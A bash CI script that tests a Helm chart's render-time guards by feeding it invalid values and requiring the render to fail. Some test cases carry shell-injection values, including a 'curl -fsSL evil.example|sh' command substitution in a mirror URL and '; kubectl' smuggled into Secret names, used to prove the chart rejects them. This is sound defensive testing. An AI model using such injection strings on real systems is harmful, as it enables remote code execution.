#!/usr/bin/env bash
# Exercises the chart's RENDER-TIME guards.
#
# Why this exists: `helm lint --strict` downgrades a template's `fail()`
# to an INFO line and exits 0 — verified on helm 3.16.3, which prints
# `level=INFO msg="funcMap fail"` for every guard it hits and still
# reports "0 chart(s) failed". So the one job that looked like it
# checked the guards could never fail on them. The two placeholder
# guards are disarmed in the render fixture the honest way: the
# fixture's `clientSecrets` carry lint-dummy values and its convergence
# envSecrets rows are complete, so nothing resolves to a placeholder —
# not a `failOnPlaceholderSecrets=false` switch (no CI render passes
# that; the flag stays ON everywhere). A
# guard that stopped firing — an inverted condition, a deleted `fail` —
# shipped green.
#
# This script renders the chart with the values each guard is supposed
# to reject and REQUIRES the render to fail, with the expected message.
# A guard that stops firing turns into a failure here.
#
# It also renders the documented valid configuration and requires it to
# SUCCEED: a guard that rejects a good deployment is a defect too.
#
# Every case below is the VALID configuration minus exactly one thing.
# The guards are evaluated in template order and the first one to fire
# wins, so a case that drops two values at once would only ever prove
# the earlier guard.
#
# COVERAGE: every guard an OPERATOR can reach has a case here (the
# enumeration is the `fail` sites of charts/genieai-umbrella/templates).
# The guards left without one are unreachable from values by construction:
#   - the envRows shape guards (a row that is not a map, a row without a
#     name, a row with neither value nor valueFrom) — the templates
#     build those rows, not the operator;
#   - the instance-count guards — the schema rejects a 0 first;
#   - the translation streamingEnabled guard — the schema types the
#     knob as a boolean and rejects a non-boolean first;
#   - the realm-file guard — it checks a file of the CHART, not a value.
#
# Usage: scripts/render-guards-check.sh [chart-path]
#        CHART=charts/genieai-umbrella scripts/render-guards-check.sh
set -uo pipefail

CHART="${1:-${CHART:-charts/genieai-umbrella}}"
NS="${NS:-genieai}"
RELEASE=test

fails=0

# The values a complete, valid release carries: the shared CI fixture
# (charts/ci/render-base-flags: deployment data, the client-secret
# tickets, and the convergence envSecrets rows the realm's $(env:VAR)
# placeholders resolve from) with the guard's own host and value names
# substituted in. Sourcing the fixture instead of copying it keeps this
# list from drifting off the configuration every other gate renders — a
# flag added to the fixture arrives here automatically.
valid_flags() {
  local ci="$(dirname "$CHART")/ci"
  sed \
    -e 's/ci-render\.local/guard.example.org/' \
    -e 's/ci-render@example\.org/ops@example.org/' \
    -e 's/no-reply@ci\.invalid/no-reply@guard.example.org/' \
    -e 's/smtp\.invalid/smtp.guard.example.org/' \
    "${ci}/render-base-flags"
}

# The same list minus the lines whose flag prefix matches $1.
valid_flags_except() {
  valid_flags | grep -v -- "$1"
}

# render_capture <flags...> — sets GUARD_OUTPUT and GUARD_RC for the
# four helpers below, so the render mechanics live in exactly one copy.
render_capture() {
  GUARD_OUTPUT="$(helm template "${RELEASE}" "${CHART}" -n "${NS}" "$@" 2>&1)"
  GUARD_RC=$?
}

# expect_fail <label> <expected message fragment> <flags...>
expect_fail() {
  local label="$1" expected="$2"
  shift 2
  local output rc
  render_capture "$@"
  output="${GUARD_OUTPUT}"
  rc="${GUARD_RC}"
  if [ "${rc}" -eq 0 ]; then
    echo "FAIL: ${label} — the render SUCCEEDED; the guard did not fire"
    fails=$((fails + 1))
    return
  fi
  if ! printf '%s' "${output}" | grep -qF "${expected}"; then
    echo "FAIL: ${label} — the render failed, but not with the expected message:"
    printf '%s\n' "${output}" | head -6
    fails=$((fails + 1))
    return
  fi
  echo "PASS: ${label} — guard fired"
}

# expect_ok <label> <flags...>
expect_ok() {
  local label="$1"
  shift
  local output rc
  render_capture "$@"
  output="${GUARD_OUTPUT}"
  rc="${GUARD_RC}"
  if [ "${rc}" -ne 0 ]; then
    echo "FAIL: ${label} — the render was REJECTED by a guard:"
    printf '%s\n' "${output}" | head -6
    fails=$((fails + 1))
    return
  fi
  echo "PASS: ${label} — render accepted"
}

# 1. The public hostname is deployment data: the issuer is unresolvable
#    without it.
expect_fail "ingress.host is required" \
  "ingress.host is required" \
  $(valid_flags_except "ingress.host")

# 2. The operator contact: a realm with no admin contact is unusable.
expect_fail "data.keycloak.adminEmail is required" \
  "data.keycloak.adminEmail is required" \
  $(valid_flags_except "adminEmail")

# 3. The mail server: the realm verifies addresses and resets passwords
#    by default, and a realm that sends mail needs a mail server.
expect_fail "verifyEmail without smtp" \
  "data.keycloak.verifyEmail=true requires data.keycloak.smtp" \
  $(valid_flags_except "smtp.")

expect_fail "resetPasswordAllowed without smtp" \
  "data.keycloak.resetPasswordAllowed=true requires data.keycloak.smtp" \
  $(valid_flags_except "smtp.") --set data.keycloak.verifyEmail=false

# 3b. A CLEARED knob is not an "off" knob. Helm deletes a key an
#     overlay sets to null, so the template reads it as absent — and
#     the fallback it applies must be the one values.yaml declares.
#     Both knobs are declared `true`, so a nulled knob must still be
#     true: with a `false` fallback the guard stopped firing AND the
#     realm was imported with verification and password reset off,
#     the opposite of the documented default, with no error anywhere.
expect_fail "a cleared verifyEmail knob" \
  "data.keycloak.verifyEmail=true requires data.keycloak.smtp" \
  $(valid_flags_except "smtp.") --set data.keycloak.verifyEmail=null

expect_fail "a cleared resetPasswordAllowed knob" \
  "data.keycloak.resetPasswordAllowed=true requires data.keycloak.smtp" \
  $(valid_flags_except "smtp.") --set data.keycloak.verifyEmail=false \
  --set data.keycloak.resetPasswordAllowed=null

# 4. The placeholder-secret guard (the chart default is true). The
#    shared CI render fixture switches it OFF, so nothing else in the
#    pipeline exercises it.
expect_fail "placeholder client secret" \
  "data.keycloak.clientSecrets.proxyClient is empty or a placeholder" \
  $(valid_flags_except "clientSecrets.")

# 5. The realm's own placeholders: every $(env:VAR) the realm body
#    carries must be exported by a convergence envSecrets row, or kcc
#    fails at import with an opaque parse error.
expect_fail "unresolved realm placeholder" \
  'references $(env:EMAIL_PASSWORD)' \
  $(valid_flags_except "convergence.envSecrets")

# 6. An IPv6-literal public host cannot be split into hostname and
#    port, and the edge would render a silently wrong listener.
expect_fail "IPv6-literal ingress.host" \
  "IPv6 literal" \
  $(valid_flags_except "ingress.host") --set 'ingress.host=[2001:db8::1]:4443' --set ingress.enabled=true

# 7. The operator's environment is a MAP. A list of {name, value} rows
#    renders one variable named 0 whose value is the Go-map string, and
#    every default the chart declares beside it disappears — so the
#    chart refuses the shape instead of rendering it.
expect_fail "the environment is a map, not a list" \
  "the environment map must be a MAP" \
  $(valid_flags) --set 'services.frontend.env[0].name=FOO' --set 'services.frontend.env[0].value=bar'

# 8. The public port in ingress.host must be a port. Sprig's `int` is
#    lenient: "443x" becomes 0, and the Gateway listener renders
#    `port: 0` — the API server rejects the CR with "spec.listeners[1].
#    port: Invalid value: 0", naming a CR field instead of the values
#    key the operator typed. The guard lives in ingressHost, the parse
#    site every consumer reaches (the issuer, the CORS origin, both
#    CSP sets, the listeners), so it fires in the DEFAULT topology —
#    the TLS-gated listeners alone would not have covered it.
expect_fail "a non-numeric port in ingress.host" \
  "ingress.host carries an invalid port" \
  $(valid_flags) --set 'ingress.host=genieai.local:443x'

# 9. A port outside the TCP range is not a port.
expect_fail "an out-of-range port in ingress.host" \
  "ingress.host carries an out-of-range port" \
  $(valid_flags) --set 'ingress.host=genieai.local:99999'

# 10. An environment variable with no value is a typo, not an empty
#     string: sprig's `toString nil` produces the four-character text
#     "<nil>", which would reach the pod as a real value.
expect_fail "an environment variable with no value" \
  "has no value: declare an empty string" \
  $(valid_flags) --set 'services.frontend.env.FOO=null'

# 11. The external GPU mode needs the GPU node it names. This is the
#     FIRST error an operator following the OPEA quickstart hits, and
#     every CI render that enables the tier passes a nodeHost — so a
#     regression that inverted or deleted the condition shipped green.
expect_fail "the external GPU mode without a node host" \
  "opea.gpu.mode=external requires opea.gpu.nodeHost" \
  $(valid_flags) --set opea.enabled=true

# 12. The GPU mode is a two-value switch.
expect_fail "an unknown opea.gpu.mode" \
  "unknown opea.gpu.mode" \
  $(valid_flags) --set opea.enabled=true --set opea.gpu.mode=weird

# 13. An IPv6 literal cannot be expressed as an ipBlock, so the egress
#     rule could never admit it.
expect_fail "an IPv6-literal GPU node host" \
  "an IPv6 literal" \
  $(valid_flags) --set opea.enabled=true --set 'opea.gpu.nodeHost=https://[2001:db8::1]:444'

# 13b. The egress port is derived from the URL's authority: a scheme-less
#      host matched nothing and the rule silently admitted TCP 443 while
#      the client dialed the node's port. The render must name the key.
expect_fail "a scheme-less GPU node host" \
  "carries no http:// or https:// scheme" \
  $(valid_flags) --set opea.enabled=true --set 'opea.gpu.nodeHost=10.0.0.110:444'

# 14. The ArangoDB mode is a two-value switch (neither is schema-enum'd).
expect_fail "an unknown data.arangodb.mode" \
  'data.arangodb.mode must be "single" or "cluster"' \
  $(valid_flags) --set data.arangodb.mode=weird

# 15. The namespace is the release namespace. Every object the chart
#     renders with an explicit namespace reads this value, so a
#     mismatch splits the release across two namespaces.
expect_fail "a namespace that is not the release namespace" \
  "must equal the release namespace" \
  $(valid_flags) --set namespace=other

# 16. A service enabled without a dependency-graph entry is not
#     validated by the pre-install dep-check hook — the hook IS the
#     contract, so the chart refuses the combination.
expect_fail "an enabled service with no dependency-graph entry" \
  "dependencyGraph.services has no 'frontend' entry" \
  $(valid_flags) --set dependencyGraph.services.frontend=null

# 17. Same for a data tier.
expect_fail "an enabled data tier with no dependency-graph entry" \
  "dependencyGraph.data has no 'postgres' entry" \
  $(valid_flags) --set dependencyGraph.data.postgres=null

# 18. Every convergence envSecrets row is operator-facing (each overlay
#     hand-writes five of them). A typo'd key rendered `name: null`, and
#     the API server rejected the whole Job at apply time with
#     "spec.template.spec.containers[0].env[N].name: Required value" —
#     naming neither the values key nor the row.
expect_fail "a convergence envSecrets row with a typo'd key" \
  'envSecrets[5] has no "envVar"' \
  $(valid_flags) --set 'data.keycloak.convergence.envSecrets[5].envvar=TYPO' \
  --set 'data.keycloak.convergence.envSecrets[5].secretName=foo' \
  --set 'data.keycloak.convergence.envSecrets[5].secretKey=bar'

# 19. A CLEARED block must degrade, not crash: the chart documents
#     `services.backend.translation: null` as the supported way to reset
#     that block to the derived defaults, and a helm TEST template
#     reading it unguarded turned it into a nil-pointer crash that named
#     the test pod instead of the values key.
expect_ok "a cleared translation block still renders" \
  $(valid_flags) --set services.backend.translation=null

# 20. A convergence row that is a SCALAR (the classic missing-dash YAML
#     mistake) must be rejected BY NAME, not crash whichever template
#     reads it first with a raw Go-template error. The shared fixture's
#     own rows would override a values file (--set beats -f), so the
#     case drops them and supplies the malformed row through a file.
scalar_rows="$(mktemp)"
trap 'rm -f "${scalar_rows}"' EXIT
cat > "${scalar_rows}" <<'YAML'
data:
  keycloak:
    convergence:
      envSecrets:
        - KC_PROXY_CLIENT_SECRET
YAML
expect_fail "a convergence envSecrets row that is not a map" \
  "must be a map {envVar, secretName, secretKey}" \
  $(valid_flags_except "convergence.envSecrets") -f "${scalar_rows}"

# 21. The envVar is an environment variable NAME: a numeric one passes
#     a non-empty check, renders as a YAML integer, and the API server
#     rejects the EnvVar name at apply time.
expect_fail "a convergence envSecrets row with a numeric envVar" \
  "is not an environment variable name" \
  $(valid_flags) --set 'data.keycloak.convergence.envSecrets[5].envVar=90210' \
  --set 'data.keycloak.convergence.envSecrets[5].secretName=foo' \
  --set 'data.keycloak.convergence.envSecrets[5].secretKey=bar'

# 22. The translation backend is DERIVED: an overlay that still sets it
#     gets a render that rejects the value by name instead of a silent
#     rewrite of what the operator asked for.
expect_fail "a translation backend the chart derives" \
  "services.backend.translation.backend is not a knob" \
  $(valid_flags) --set services.backend.translation.backend=gpu

# 23. The Keycloak CR needs a database: the chart renders exactly one
#     CNPG Cluster (the identity tier's), so turning the postgres tier
#     off while Keycloak is on deletes the only database the CR can
#     reach — and nothing reports it, the Keycloak pods just stay
#     Pending on a connection error.
expect_fail "the identity tier without its database" \
  "data.keycloak.enabled=true requires data.postgres.enabled=true" \
  $(valid_flags) --set data.postgres.enabled=false

# 24. The service images have no chart default (the registry builds
#     them): a cleared image block renders an empty image reference, and
#     the pod stays in ErrImagePull with the values key nowhere in the
#     message.
expect_fail "a service with no image repository" \
  "services.backend.image.repository is required" \
  $(valid_flags) --set services.backend.image.repository=null

# 25. The OPEA tier needs its dependency-graph entry: the pre-install
#     dep-check validates the orchestrators' requirements against it,
#     and a missing entry silently disables that validation.
expect_fail "the OPEA tier with no dependency-graph entry" \
  "dependencyGraph.opea declares no node" \
  $(valid_flags) --set opea.enabled=true \
  --set opea.gpu.nodeHost=https://gpu.ci-render.local:444 \
  --set dependencyGraph.opea=null

# 26. Grafana without a datasource is a blank canvas: every dashboard
#     renders broken. The guard fires at render time instead.
expect_fail "Grafana with no storage component" \
  "observability.grafana.enabled=true requires at least one storage component" \
  $(valid_flags) --set observability.grafana.enabled=true \
  --set observability.logs.enabled=false

# 27. A convergence row with an EMPTY value: the row is the operator's
#     own, and an empty envVar renders an env entry the API server
#     rejects. The shared fixture's rows would override a values file
#     (--set beats -f), so the case drops them and supplies the whole
#     list through a file — which is how an overlay writes it anyway
#     (Helm replaces a list wholesale).
empty_row="$(mktemp)"
trap 'rm -f "${scalar_rows}" "${empty_row}"' EXIT
cat > "${empty_row}" <<'YAML'
data:
  keycloak:
    convergence:
      envSecrets:
        - envVar: KC_PROXY_CLIENT_SECRET
          secretName: keycloak-proxy-client-secret
          secretKey: KEYCLOAK_PROXY_CLIENT_SECRET
        - envVar: KC_DATAPREP_CLIENT_SECRET
          secretName: kc-dataprep-client-secret
          secretKey: KC_DATAPREP_CLIENT_SECRET
        - envVar: KC_GRAFANA_CLIENT_SECRET
          secretName: kc-grafana-client-secret
          secretKey: KEYCLOAK_GRAFANA_CLIENT_SECRET
        - envVar: GENIE_ADMIN_PASSWORD
          secretName: keycloak-convergence-credentials
          secretKey: GENIE_ADMIN_PASSWORD
        - envVar: EMAIL_PASSWORD
          secretName: keycloak-convergence-credentials
          secretKey: EMAIL_PASSWORD
        - envVar: ""
          secretName: foo
          secretKey: bar
YAML
expect_fail "a convergence envSecrets row with an empty value" \
  "envSecrets[5].envVar is empty" \
  $(valid_flags_except "convergence.envSecrets") -f "${empty_row}"

# 28. A GPU path with no endpoint: the external endpoint is nodeHost +
#     path, and a missing path renders an empty URL the orchestrator
#     dials — a release that installs cleanly and answers no request.
#     The docling path is NOT in this class: an empty docling endpoint
#     is the documented signal that dataprep uses its in-process
#     converter.
expect_fail "a GPU path with no endpoint" \
  "opea.gpu.paths.llm is required in the external GPU mode" \
  $(valid_flags) --set opea.enabled=true \
  --set opea.gpu.nodeHost=https://gpu.ci-render.local:444 \
  --set opea.gpu.paths.llm=null

# 29. The public host is `host` or `host:port` — nothing else. A third
#     colon segment flowed verbatim into the OIDC issuer, the CORS
#     origin and both CSP connect-src sets: a browser cannot dial it,
#     and the failure lands at the token exchange, far from the values
#     key the operator typed.
expect_fail "a public host with a third colon segment" \
  "carries more than one colon segment" \
  $(valid_flags) --set ingress.host=guard.example.org:8443:extra

# 30. The dependency graph's `deps` are a LIST of names. A mistyped
#     `--set` leaves a map behind (`deps: {deps: null}`), and the
#     pre-install hook's evaluator raises a TypeError on it — naming
#     neither the values key nor the node. The render must name both.
expect_fail "a dependency list that is not a list" \
  "dependencyGraph.services.backend must be a list of strings, got map" \
  $(valid_flags) --set-json 'dependencyGraph.services.backend.deps={"deps":null}'

# 31. The list's ELEMENTS are names too: a list carrying a number
#     reaches the hook's evaluator, which compares the element with a
#     string and fails on the comparison rather than on the shape.
expect_fail "a dependency list with a non-string element" \
  "dependencyGraph.services.backend must be a list of strings, got an element of type" \
  $(valid_flags) --set-json 'dependencyGraph.services.backend=["keycloak",5]'

# 31c. The clamd LISTENER port is fixed by the image (clamd.conf, which
#      the entrypoint honours no override for): a different number moves
#      the Service, the NetworkPolicy and the probes to a port nothing
#      listens on, and every scan times out. The render rejects it.
expect_fail "a clamav listener port the image cannot serve" \
  "services.clamav.port must be 3310" \
  $(valid_flags) --set services.clamav.port=3311

# 31b. The clamav probe port is DERIVED from the listener's port: a
#      probe on another port never goes Ready. The chart honours no
#      number here, so a value that contradicts the derivation is
#      rejected by name instead of being discarded in silence.
expect_fail "a clamav probe port that is not the listener's" \
  "services.clamav.probes.readiness.tcpSocket.port must equal services.clamav.port" \
  $(valid_flags) --set services.clamav.probes.readiness.tcpSocket.port=9999

# expect_render_contains <label> <needle> <flags...>
#   The render must SUCCEED and its output must carry <needle> — the
#   positive half the expect_fail/expect_ok pair cannot express: a gate
#   or assertion whose branch stops rendering leaves every negative
#   guard green.
expect_render_contains() {
  local label="$1" needle="$2"
  shift 2
  local matches
  render_capture "$@"
  if [ "${GUARD_RC}" -ne 0 ]; then
    echo "FAIL: ${label} — the render FAILED:"
    printf '%s\n' "${GUARD_OUTPUT}" | head -6
    fails=$((fails + 1))
    return
  fi
  # grep -c, never -q: under pipefail, -q's early exit on the first
  # match SIGPIPEs the 700 KB render's writer and the pipeline reports
  # 141 — a match counted as a miss. -c reads the whole input. An empty
  # count (a killed grep) FAILS the guard: no evidence is not a pass.
  matches="$(printf '%s' "${GUARD_OUTPUT}" | grep -cF -- "${needle}")" || true
  if [ "${matches:-0}" -lt 1 ]; then
    echo "FAIL: ${label} — the render succeeded but does not contain: ${needle}"
    fails=$((fails + 1))
    return
  fi
  echo "PASS: ${label} — rendered output carries the assertion"
}

# expect_render_lacks <label> <needle> <flags...>
expect_render_lacks() {
  local label="$1" needle="$2"
  shift 2
  local matches
  render_capture "$@"
  if [ "${GUARD_RC}" -ne 0 ]; then
    echo "FAIL: ${label} — the render FAILED:"
    printf '%s\n' "${GUARD_OUTPUT}" | head -6
    fails=$((fails + 1))
    return
  fi
  matches="$(printf '%s' "${GUARD_OUTPUT}" | grep -cF -- "${needle}")" || true
  # An empty count is a killed grep, not a clean zero: the guard fails
  # unless the count is EXACTLY 0.
  if [ "${matches:-X}" != "0" ]; then
    echo "FAIL: ${label} — the render still contains: ${needle}"
    fails=$((fails + 1))
    return
  fi
  echo "PASS: ${label} — rendered output does not carry the assertion"
}

# 33. The data-deps gate covers every assertion's condition (runs
#     14-16 each found a shape the gate skipped): the assertions must
#     render — and be absent — in the shapes they name, or a future
#     re-narrowing lands green because no CI render exercises it.
expect_render_contains \
  "the admin Secret is asserted with convergence disabled" \
  'required_secrets="$required_secrets keycloak-admin-credentials"' \
  $(valid_flags) --set data.keycloak.convergence.enabled=false

expect_render_contains \
  "the pre-baked Gateway TLS Secret is asserted" \
  'required_secrets="$required_secrets edge-tls-guard-check"' \
  $(valid_flags) --set ingress.enabled=true --set ingress.tls.enabled=true --set ingress.tls.secretName=edge-tls-guard-check

expect_render_lacks \
  "no vllm assertion without a consumer (backend off)" \
  "vllm-api-key" \
  $(valid_flags) --set services.backend.enabled=false --set services.backend.translation.endpoint=https://gpu.guard.example.org:444/v1

# 34. An operator-supplied Secret name reaches the test pods' shell:
#     a value that is not a Kubernetes Secret name fails the RENDER
#     naming the values key, never the shell inside the pod. One case
#     per wrapped row — unwrapping any ONE of them must land a red
#     guard here, not a silent raw interpolation.
expect_fail "a Secret name that is not a Secret name (ingress.tls.secretName)" \
  "ingress.tls.secretName" \
  $(valid_flags) --set ingress.enabled=true --set ingress.tls.enabled=true --set 'ingress.tls.secretName=not a name; kubectl'

expect_fail "a Secret name that is not a Secret name (data.keycloak.db.secretName)" \
  "data.keycloak.db.secretName" \
  $(valid_flags) --set 'data.keycloak.db.secretName=bad name; kubectl'

expect_fail "a Secret name that is not a Secret name (bootstrapAdmin.userSecret)" \
  "data.keycloak.bootstrapAdmin.userSecret" \
  $(valid_flags) --set 'data.keycloak.bootstrapAdmin.userSecret=bad name; kubectl'

expect_fail "a convergence envSecrets row secretName that is not a Secret name" \
  "data.keycloak.convergence.envSecrets[0].secretName" \
  $(valid_flags) --set 'data.keycloak.convergence.envSecrets[0].secretName=bad name; kubectl'

expect_fail "a Secret name past the 253-character DNS-subdomain bound" \
  "is longer than the Kubernetes Secret-name bound" \
  $(valid_flags) --set ingress.enabled=true --set ingress.tls.enabled=true --set "ingress.tls.secretName=$(printf 'a%.0s' $(seq 1 63)).$(printf 'b%.0s' $(seq 1 63)).$(printf 'c%.0s' $(seq 1 63)).$(printf 'd%.0s' $(seq 1 63))"

expect_fail "a Secret name with a dot-label past the 63-character bound" \
  "carries a dot-label longer than the Kubernetes bound" \
  $(valid_flags) --set ingress.enabled=true --set ingress.tls.enabled=true --set "ingress.tls.secretName=a.$(printf 'b%.0s' $(seq 1 64)).c"

# The scheme-ful mirror must reach the init container's shell VERBATIM:
# expect_ok alone would pass a template that mangles the value in
# transit (a re-prefixed BASE, dropped quoting) — the needle pins the
# path (rendered 3x, one per tools-init consumer).
expect_render_contains \
  "a scheme-ful kubeletToolsMirror reaches the init shell verbatim" \
  'BASE="https://mirror.internal:8443"' \
  $(valid_flags) --set global.kubeletToolsMirror=https://mirror.internal:8443

expect_fail "a kubeletToolsMirror with a non-http scheme" \
  "kubeletToolsMirror" \
  $(valid_flags) --set 'global.kubeletToolsMirror=file://mirror.internal'

expect_fail "a kubeletToolsMirror with a colon-host (no numeric port)" \
  "kubeletToolsMirror" \
  $(valid_flags) --set 'global.kubeletToolsMirror=https:mirror.internal:8443'

# 34b. The two global tooling keys are interpolated into the tools-init
#      container's shell: the values schema constrains them to the URL /
#      architecture shapes, so a shell-bearing value is rejected by the
#      render instead of executed by the init container.
expect_fail "a kubeletToolsMirror carrying shell metacharacters" \
  "kubeletToolsMirror" \
  $(valid_flags) --set 'global.kubeletToolsMirror=https://dl.k8s.io$(curl -fsSL evil.example|sh)'

expect_fail "a toolingArch outside the download URL's vocabulary" \
  "toolingArch" \
  $(valid_flags) --set global.toolingArch=x86_64

# 32. The documented valid configuration must still render: a guard that
#     rejects a good deployment is a defect too.
expect_ok "the documented values render" $(valid_flags)

if [ "${fails}" -ne 0 ]; then
  echo
  echo "${fails} render guard(s) did not behave as documented."
  exit 1
fi
echo
echo "every render guard fired as documented, and the valid configuration rendered"
